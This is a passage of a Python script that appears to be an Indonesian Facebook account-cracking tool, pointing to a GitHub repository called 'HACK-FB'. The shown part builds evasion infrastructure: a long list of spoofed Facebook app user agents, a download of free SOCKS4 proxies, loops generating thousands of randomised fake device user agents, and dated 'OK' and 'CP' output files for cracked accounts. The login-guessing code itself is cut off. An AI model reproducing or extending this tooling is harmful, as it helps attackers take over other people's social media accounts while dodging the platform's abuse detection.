		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20C65 [FBAN/FBPageAdmin;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.2;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/B7D4BC73-59EB-41F0-9C50-48DC0BE83772]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H117 [FBAN/FBPageAdmin;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/15.7.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/8613AF12-A13C-4025-9DFC-B412B9874CC3]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20B82 [FBAN/FBPageAdmin;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.1;FBSS/3;FBID/phone;FBLC/da_DK;FBOP/5;FBDI/BE9904C1-02F3-4FF4-A216-0D0186BE28CA]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G71 [FBAN/FBPageAdmin;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.6;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/9285700B-42ED-436C-9503-3A583CA7092D]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBPageAdmin;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBDI/E9AF8DA6-3525-4138-83FC-27CB5EE84A4D]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBPageAdmin;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/8409F012-C3CD-4CBF-AE73-055ECF0F61CB]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBPageAdmin;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/DAD28809-6C44-43B9-97EB-D9ABED1C63C4]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77 [FBAN/FBPageAdmin;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/15.5;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5;FBDI/DEF09D63-CEC0-46B0-9A91-24AE98C99736]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19C63 [FBAN/FBPageAdmin;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.2.1;FBSS/2;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/917F706D-DE04-44EE-A132-23035F24B5A4]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19C63 [FBAN/FBPageAdmin;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/15.2.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/568D4DA5-4665-4325-9206-2ADB71EA3112]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52 [FBAN/FBPageAdmin;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/15.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBDI/F30CA2E6-3DD8-421D-AD0D-1A18B2DC6E2B]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18H107 [FBAN/FBPageAdmin;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/AC79D0DC-23B9-4DF6-8C59-F5A44E8B1D75]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D50 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/15.3;FBSS/3;FBID/phone;FBLC/hu_HU;FBOP/5;FBDI/50B190C7-0A49-4245-98D2-2B52E2C3E15F]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19B74 [FBAN/FBPageAdmin;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/15.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/4CD427CB-C8AD-48EF-9A15-C5243A9D0BC5]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18H107 [FBAN/FBPageAdmin;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/99627F61-AD7C-47FC-9B6D-1A5E8598E73F]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18H17 [FBAN/FBPageAdmin;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/14.8;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/2CD1905A-6A0F-48E0-8AB3-BE55C4CC4689]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/hu_HU;FBOP/5;FBDI/50B190C7-0A49-4245-98D2-2B52E2C3E15F]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/2;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/77AD5F85-8921-49EF-810A-931B1BE60ED8]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/14.4.2;FBSS/3;FBID/phone;FBLC/uk_UA;FBOP/5;FBDI/47BE7009-CB71-4C56-8003-EEB775BC714F]"
		"Mozilla/5.0 (iPad; CPU OS 12_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.5;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5;FBDI/8A557717-7CF9-4264-8A8D-D1DE6F3AD7E1]"
		"Mozilla/5.0 (iPad; CPU OS 12_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.5.1;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5;FBDI/D9C021E4-148B-4158-9C41-FBA8E68EB3D8]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/12.4.9;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBDI/7B7D2256-5843-4E84-AC9E-E7B086C39388]"
		"Mozilla/5.0 (iPad; CPU OS 12_4_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/12.4.9;FBSS/2;FBID/tablet;FBLC/ru_RU;FBOP/5;FBDI/8A557717-7CF9-4264-8A8D-D1DE6F3AD7E1]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/14.4.2;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/1BBEFD49-F2E6-4C19-AE10-A2D1075B0DFF]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/13.7;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBDI/8B86F0CB-22B7-42E9-BCE0-987B36794783]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/81C4138A-1CE7-45B7-8B4E-2C6E0B74C5AA]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/14.4.2;FBSS/3;FBID/phone;FBLC/hu_HU;FBOP/5;FBDI/50B190C7-0A49-4245-98D2-2B52E2C3E15F]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/3;FBID/phone;FBLC/hu_HU;FBOP/5;FBDI/50B190C7-0A49-4245-98D2-2B52E2C3E15F]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/14.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBDI/10576A5B-345B-49C8-BCBA-020B7DA2306E]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/14.4;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/CC13F623-6B20-496A-9523-943D4B43A5F9]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/14.3;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBDI/527B855B-B878-420F-93C4-9000BAB072EE]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/14.4;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/14.3;FBSS/3;FBID/phone;FBLC/ru_RU;FBOP/5;FBDI/EE699252-1A4E-4835-ADDE-D1E4C35067EC]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/14.0.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBDI/85B6E63F-54BB-4925-99E4-410F4EBC078D]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/14.3;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/7C99F7DD-3C36-4C47-8352-3B8688477FC4]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5;FBDI/2801586E-D05C-411E-864B-88BF55DA058F]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/F1F4C422-4053-461C-8E0B-750049B755F9]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/14.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBDI/A368D926-8BE4-4E21-BBFA-E5665B932DCB] [ip:87.10.9.219]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/2;FBID/phone;FBLC/hu_HU;FBOP/5;FBDI/099B01BC-EFE0-4AC2-9956-A27FBE9728F9]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 13_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.6.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone8,4;FBMD/iPhone;FBSN/iOS;FBSV/14.0;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBDI/84585C1B-5FC0-4DE4-8F00-9F7123583957]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.7;FBSS/2;FBID/phone;FBLC/ru_RU;FBOP/5;FBCR/]"
		"Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPad8,12;FBMD/iPad;FBSN/iOS;FBSV/14.0;FBSS/2;FBID/tablet;FBLC/en_GB;FBOP/5;FBDI/246449CE-3622-43A8-AF32-63481C1E4F5A]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBCR/]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone10,2;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5;FBCR/KDDI]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBPageAdmin;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/3;FBID/phone;FBLC/vi_VN;FBOP/5;FBCR/Viettel]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBPageAdmin;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.4;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/vodafone HU]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBPageAdmin;FBAV/86.0;FBBV/83286586;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/6;FBRV/0]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBPageAdmin;FBAV/106.0;FBBV/115375790;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0]"
		"Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBPageAdmin;FBAV/86.0;FBBV/83286586;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/0]"
	]
)




try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda');exit()
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Redmi 4A Build/MMB29M; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 hola_android'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	

#------------[ UBAH UA DIH SINI OM ]---------------#
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    merek = random.choice(['SM-A405FN','SM-A346M','SM-J415FN','SM-X706B','SM-J337R4','SM-A9000','SM-G532G','SM-J810M','SM-T280'])
    build = random.choice(['LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.{str(rr(0,4))} Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {merek} Build/{build}.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,12))}.{str(rr(1,9))}.{str(rr(1,9))}like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile/14G60 Safari/604.1"
    UaMainn = random.choice([u1, u2, u3])
    ugen.append(UaMainn)

for memekx in range(200):
	android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
	fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
	fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
	build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
	merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
	fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
	fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
	fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
	merk_build = str(random.choice(merk2))+'<=>'+str(random.choice(build2));merks,build2 = merk_build.split('<=>')
	large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')      
	dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
	ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1612 Build/NRD90M) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1612;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build2)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi 5A Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
	api = str(rc([ua1,ua2,ua3]))
	liu.append(api)
	
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('__ua.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Rudal-XD/HACK-FB/blob/main/bbnew.txt').text
		ua=open('__ua.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('__ua.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
    Console(width=80, style="bold cyan").print(Panel("""
[bold yellow] _______           ______   _______  _                 ______  
(  ____ )|\     /|(  __  \ (  ___  )( \      |\     /|(  __  \ 
| (    )|| )   ( || (  \  )| (   ) || (      ( \   / )| (  \  )
| (____)|| |   | || |   ) || (___) || | _____ \ (_) / | |   ) |
|     __)| |   | || |   | ||  ___  || |(_____) ) _ (  | |   | |
| (\ (   | |   | || |   ) || (   ) || |       / ( ) \ | |   ) |
| ) \ \__| (___) || (__/  )| )   ( || (____/\( /   \ )| (__/  )
